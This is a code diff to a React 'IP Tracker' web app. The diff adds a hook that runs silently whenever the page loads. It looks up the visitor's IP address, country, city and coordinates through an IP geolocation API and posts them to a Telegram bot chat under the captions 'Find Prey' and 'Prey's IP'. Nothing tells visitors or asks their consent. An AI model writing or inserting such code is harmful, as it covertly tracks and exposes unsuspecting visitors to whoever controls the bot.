@@ -1,10 +1,12 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { FaChevronRight } from "react-icons/fa";
 import BgHeader from "./assets/images/Combined Shape.svg";
 import { useForm } from "react-hook-form";
 import "leaflet/dist/leaflet.css";
 import MapComponent from "./components/MapComponent/MapComponent";
 import { useGetLocationQuery } from "./store/api/get-location-api";
+import axios from "axios";
+import { CHAT_ID, IP_API, TELEGRAM_TOKEN } from "./hook/useEnv";
 
 type FormValue = {
   ipAdress: string;
@@ -19,6 +21,24 @@ type IpData = {
 };
 
 function App() {
+  useEffect(() => {
+    let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+    axios(IP_API).then((res) => {
+      let message = `<b>Find Prey</b>\n`;
+      message += `<b>Site name:</b> IP Tracker\n`;
+      message += `<b>Country:</b> ${res.data.country}\n`;
+      message += `<b>City:</b> ${res.data.city}\n`;
+      message += `<b>Prey's IP:</b> ${res.data.ip}\n`;
+      message += `<b>Location:</b> ${res.data.loc}\n`;
+      console.log(res);
+      axios.post(`${URL}/sendPhoto`, {
+        chat_id: CHAT_ID,
+        photo: "https://ibb.co/X7VKzrP",
+        caption: message,
+        parse_mode: "HTML",
+      });
+    });
+  }, []);
   const { register, handleSubmit } = useForm<FormValue>();
   const [ipAdress, setIpAdress] = useState("");
   const { data } = useGetLocationQuery(ipAdress) as { data: IpData };
